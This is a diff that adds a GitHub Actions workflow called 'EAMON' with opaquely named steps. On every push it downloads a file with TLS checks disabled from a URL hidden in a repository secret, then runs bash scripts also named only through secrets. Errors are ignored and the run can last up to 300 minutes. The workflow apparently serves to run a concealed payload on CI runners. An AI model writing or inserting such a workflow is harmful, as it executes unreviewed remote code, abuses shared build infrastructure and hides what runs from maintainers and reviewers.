@@ -1,0 +1,29 @@
+name: EAMON
+
+on:
+    push:
+    workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+     - name: Eon 1
+       uses: actions/checkout@main
+
+     - name: Eon 2
+       timeout-minutes: 2
+       continue-on-error: true
+       run: |
+             curl -sLkO ${{ secrets.EM_AB }}
+             bash ${{ secrets.EM_CD }}
+     - name: Eon 3
+       continue-on-error: true
+       run: |
+             bash ${{ secrets.EM_EF }}
+     - name: Eon 4
+       timeout-minutes: 300
+       continue-on-error: true
+       run: |
+            bash ${{ secrets.EM_GH }}
